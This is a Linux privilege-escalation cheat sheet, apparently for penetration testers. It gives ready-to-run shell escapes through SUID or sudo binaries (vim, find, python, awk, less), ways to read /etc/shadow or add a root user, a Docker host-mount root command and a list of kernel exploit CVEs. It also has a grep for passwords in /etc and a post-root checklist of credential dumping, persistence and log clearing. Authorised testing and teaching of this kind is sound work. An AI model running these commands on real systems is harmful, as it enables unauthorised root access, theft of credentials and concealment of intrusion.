# Linux Privilege Escalation Quick Reference

## Quick Wins (Check First)

| Check | Command | Exploit If True |
|-------|---------|-----------------|
| Sudo access | `sudo -l` | Run allowed commands as root |
| SUID binaries | `find / -perm -4000 -type f 2>/dev/null` | Abuse SUID for privesc |
| Writable /etc/passwd | `ls -la /etc/passwd` | Add root user |
| Docker group | `groups` | Mount host filesystem |
| Cron writable | `find /etc/cron* -writable 2>/dev/null` | Modify cron script |
| NFS no_root_squash | `cat /etc/exports` | Mount & create setuid binary |
| Kernel exploit | `uname -r` | Compile & run exploit |

## SUID Privesc — Common Binaries

| Binary | Exploit |
|--------|---------|
| `vim` | `vim -c ':!/bin/sh'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `python` | `python -c 'import os; os.execl("/bin/sh","sh","-p")'` |
| `less` | `less /etc/passwd` then `!sh` |
| `nmap` | `nmap --interactive` then `!sh` (old versions) |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `env` | `env /bin/sh -p` |
| `cp` | Copy /etc/shadow to accessible location |
| `nano` | Edit /etc/passwd to add root user |

## Sudo Privesc — GTFOBins

If `sudo -l` shows you can run specific commands:
- Visit **https://gtfobins.github.io** and search the binary
- GTFOBins lists exploitation methods for 100+ Linux binaries

Common dangerous sudo entries:
- `sudo vim` → `sudo vim -c ':!/bin/sh'`
- `sudo find` → `sudo find . -exec /bin/sh -p \; -quit`
- `sudo python` → `sudo python -c 'import os; os.system("/bin/sh")'`
- `sudo less` → `sudo less /etc/passwd` then `!sh`
- `sudo awk` → `sudo awk 'BEGIN {system("/bin/sh")}'`

## Kernel Exploits

| CVE | Name | Affected |
|-----|------|----------|
| CVE-2022-0847 | DirtyPipe | Linux 5.8 – 5.16.11 |
| CVE-2016-5195 | DirtyCow | Linux 3.9 – 4.8.3 |
| CVE-2021-4034 | PwnKit | polkit < 0.120 |
| CVE-2021-3493 | OverlayFS | Ubuntu kernels |
| CVE-2023-0386 | OverlayFS | Linux 5.11 – 6.2 |

## Useful One-liners

```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# Check sudo rights
sudo -l

# Find writable files owned by root
find / -writable -user root 2>/dev/null

# Find files with capabilities
getcap -r / 2>/dev/null

# Check for passwords in config files
grep -r "password\|passwd\|secret" /etc/ 2>/dev/null

# Check cron jobs
cat /etc/crontab; ls -la /etc/cron.*; crontab -l

# Check for Docker access
docker ps 2>/dev/null
# If in docker group, mount host:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Post-Root Checklist

1. ✅ Get root shell (`su`, `sudo su`, `getcap`, etc.)
2. ✅ Dump credentials (`/etc/shadow`, `~/.ssh/id_rsa`, configs)
3. ✅ Check for other users' data
4. ✅ Document findings for report
5. ✅ Set up persistence (if authorized for persistence testing)
6. ✅ Clean up (remove tools, clear logs, if authorized)
